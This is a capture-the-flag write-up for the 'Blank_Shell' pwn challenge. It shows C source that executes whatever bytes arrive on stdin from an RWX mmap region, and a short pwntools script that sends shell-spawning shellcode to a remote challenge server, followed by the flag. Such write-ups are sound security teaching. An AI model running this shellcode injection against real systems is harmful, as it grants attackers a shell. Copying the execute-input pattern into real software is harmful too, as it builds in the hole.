# Blank_Shell

**Description**:  
We meet atlast, Agent 007! I present to you the blank shell of the Egyptian Sarcophagus. Whatever you give it will be presented back to you by this special Sarcophagus. Remember, the shell maybe empty but in lies treasures untold. To your imminent victory!


**Author:  [Ath3n1x](https://twitter.com/Ath3n1x)**


**Solution**: 
First lets check the permissions with `checksec`:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Except for canary, everything else is enabled. 

Now lets run the program and take a look at its source. 
```c
int main(int argc, char **argv) { 
    int* addr = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    read(0, addr, 100);
    
    void (*shellcode)() = (void (*)()) addr;
    shellcode();
}
```

Here you can see that the program is using the `mmap` system call to allocate a memory region and then reads data into this allocated memory from the standard input (stdin) before attempting to execute it as a function.
`shellcode();` calls the function pointed to by shellcode. Since this function pointer is set to the memory region where data was read from standard input, it attempts to execute that data as if it were a function.

So in short, it creates an executable region in memory and then takes in any arbitary shellcode that the user gives and executes it.

Therefore if we provide a shellcode that can spawn a shell then its imminent victory!

**Exploit**:
```python
from pwn import *

p = remote("13.234.11.113", 30125)

context.arch = "amd64"

p.sendline(asm(shellcraft.sh()))

p.interactive()
```


**Flag: `shaktictf{sh3llc0d1ng_15_4_p13c3_0f_c4k3_9270138712038}`**            
